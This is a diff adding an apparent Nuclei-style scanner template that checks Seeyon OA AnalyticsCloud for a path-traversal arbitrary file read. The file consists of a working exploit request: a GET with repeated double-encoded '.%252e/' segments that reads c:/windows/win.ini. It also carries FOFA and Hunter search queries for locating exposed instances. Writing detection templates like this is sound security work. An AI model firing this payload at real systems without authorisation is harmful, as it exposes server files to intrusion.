@@ -1,0 +1,30 @@
+id: seeyon-AnalyticsCloud-fileread
+info:
+  name: 致远 OA AnalyticsCloud - 路径穿越任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: title="AnalyticsCloud 分析云"
+    hunter-query: web.title="AnalyticsCloud 分析云"
+  tags: seeyon,fileread,fileread,oa,cloud
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/a/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
+
+      - type: status
+        status:
+          - 200
